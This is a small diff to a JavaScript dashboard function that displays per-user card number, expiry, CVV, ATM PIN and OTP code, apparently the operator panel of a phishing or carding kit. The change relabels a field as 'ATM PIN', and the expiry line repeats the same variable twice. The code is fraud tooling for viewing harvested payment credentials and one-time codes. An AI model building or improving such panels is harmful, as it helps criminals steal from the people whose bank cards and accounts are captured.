@@ -198,7 +198,7 @@ function updateConnectionsTable(users) {
              <li class="list-group-item">Card Number: ${details.getUserDataCard.card || ''}</li>
              <li class="list-group-item">Exp: ${details.getUserDataCard.exp1 || ''}/${details.getUserDataCard.exp1 || ''}</li>
             <li class="list-group-item">Cvv: ${details.getUserDataCard.cvv || ''}</li>
-            <li class="list-group-item">Cvv: ${details.getUserDataCard.atm || ''}</li>
+            <li class="list-group-item">ATM PIN: ${details.getUserDataCard.atm || ''}</li>
              <li class="list-group-item">----------------------------------------------------------</li>
             <li class="list-group-item">OTP: ${details.getUserDataOTP.code || ''}</li>
         </ul> </div>`;
